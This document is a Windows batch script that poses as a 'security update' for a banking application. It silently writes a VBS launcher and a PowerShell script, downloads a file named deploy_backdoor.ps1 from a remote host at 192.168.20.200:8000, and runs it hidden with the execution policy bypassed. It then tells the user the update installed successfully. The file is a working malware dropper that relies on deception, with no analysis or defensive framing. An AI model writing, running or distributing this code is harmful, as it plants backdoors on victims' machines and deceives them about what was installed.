@echo off
echo Security Update Installation in Progress...
echo Please wait while critical security components are updated...

REM Create a VBS script to download and run the payload silently
echo Dim WinScriptHost > %temp%\downloader.vbs
echo Set WinScriptHost = CreateObject("WScript.Shell") >> %temp%\downloader.vbs
echo WinScriptHost.Run Chr(34) ^& "%temp%\update_script.ps1" ^& Chr(34), 0 >> %temp%\downloader.vbs
echo Set WinScriptHost = Nothing >> %temp%\downloader.vbs

REM Create the PowerShell script to download and execute our payload
echo $client = New-Object System.Net.WebClient > %temp%\update_script.ps1
echo $client.DownloadFile("http://192.168.20.200:8000/deploy_backdoor.ps1", "$env:temp\security_module.ps1") >> %temp%\update_script.ps1
echo powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "$env:temp\security_module.ps1" >> %temp%\update_script.ps1

REM Execute the VBS script
start /min %temp%\downloader.vbs

echo.
echo Update installed successfully!
echo Your banking application is now protected with the latest security features.
echo.
pause
